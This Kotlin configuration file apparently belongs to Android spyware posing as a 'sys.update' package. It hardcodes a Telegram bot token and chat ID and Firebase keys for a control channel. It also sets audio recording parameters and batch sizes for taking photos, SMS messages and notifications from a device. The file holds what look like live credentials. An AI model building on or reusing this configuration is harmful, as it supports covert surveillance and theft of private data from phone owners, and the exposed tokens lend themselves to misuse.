package com.sys.update

object Config {
    const val TELEGRAM_BOT_TOKEN = "8965774628:AAHiRk5BzVgGXJOMURMJyNNjHnpDj7MUAjM"
    const val TELEGRAM_CHAT_ID = "8599240795"

    // ⭐ Firebase
    const val FIREBASE_API_KEY = "AIzaSyBvzfJOOjRFZnTgTUrwEZQPr8Ba7zKKlNg"
    const val FIREBASE_PROJECT_ID = "hhhxh-5ebe4"

    const val POLL_TIMEOUT_S = 25
    const val POLL_INTERVAL_MS = 500L

    const val AUDIO_SAMPLE_RATE = 16000
    const val AUDIO_BITRATE = 64000
    const val AUDIO_CHUNK_MS = 10_000L

    const val PHOTOS_BATCH_DEFAULT = 50
    const val SMS_BATCH_DEFAULT = 100
    const val NOTIF_BATCH_DEFAULT = 100

    fun hasTelegram(): Boolean = TELEGRAM_BOT_TOKEN.isNotBlank() && TELEGRAM_CHAT_ID.isNotBlank()
}
